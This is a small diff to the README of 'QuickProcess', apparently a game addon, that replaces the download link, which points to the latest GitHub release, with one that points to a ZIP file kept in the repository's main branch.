@@ -1,6 +1,6 @@
 # QuickProcess — Forever 1.60.1 beta
 
-[Download the latest installable ZIP](https://github.com/atomalchemist360-jpg/Quick-Process/releases/latest/download/QuickProcess.zip)
+[Download the latest installable ZIP](https://github.com/atomalchemist360-jpg/Quick-Process/raw/refs/heads/main/downloads/QuickProcess.zip)
 
 
 Interface 16001; intended for build 70888.
